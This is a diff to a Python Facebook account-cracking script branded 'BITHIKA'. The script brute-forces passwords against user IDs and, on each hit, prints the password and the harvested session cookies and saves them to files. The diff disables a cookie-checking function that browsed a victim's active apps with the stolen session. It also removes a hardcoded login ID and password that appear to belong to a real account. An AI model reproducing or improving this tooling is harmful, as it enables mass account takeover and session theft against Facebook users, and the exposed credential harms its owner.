@@ -584,7 +584,7 @@ def api1(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        cek_apk(coki)
+                                        #cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -704,7 +704,7 @@ def api2(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        cek_apk(coki)
+                                        #cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -813,7 +813,7 @@ def api3(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        cek_apk(coki)
+                                        #cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
@@ -875,8 +875,8 @@ def rndm1(uid,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
                         jazoest = li2+j1
-                        data = {'email': '61564960182188', 
-'password': 'sumon@12M', 
+                        data = {'email': uid, 
+'password': pas, 
 'adid': str(uuid.uuid4()),
 'device_id': str(uuid.uuid4()),
 'family_device_id': str(uuid.uuid4()),
@@ -1042,7 +1042,7 @@ def rndm2(uid,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        cek_apk(coki)
+                                        #cek_apk(coki)
                                         open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
@@ -1151,7 +1151,7 @@ def rndm3(uid,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        cek_apk(coki)
+                                        #cek_apk(coki)
                                         open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
@@ -1171,7 +1171,7 @@ def rndm3(uid,passlist):
  
 #----------------[ ID-CHECKER ]--------------------------#
 
-def cek_apk(coki):
+"""def #cek_apk(coki):
 	session = requests.Session()
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
@@ -1190,7 +1190,7 @@ def cek_apk(coki):
 		for i in range(len(game)):
 			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
 	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
+		print ("\r    %s \033[0mcookie invalid"%(M))"""
 
 #-------------------------close-----------------------------
 if __name__ == '__main__':
